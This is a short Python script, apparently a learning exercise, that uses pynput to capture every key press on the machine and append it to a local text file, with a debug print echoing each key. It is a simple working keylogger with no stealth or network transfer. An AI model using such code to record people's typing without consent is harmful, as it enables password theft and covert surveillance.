from pynput import keyboard
from pynput.keyboard import Key

def keyPressed(key):
    print(f"Pressed: {key}")  # TEMP: to see if it's working
    with open("keyfile.txt", 'a') as logKey:
        try:
            logKey.write(key.char)
        except AttributeError:
            if key == Key.space:
                logKey.write(' ')
            elif key == Key.enter:
                logKey.write('\n')
            else:
                logKey.write(f'[{key.name}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()


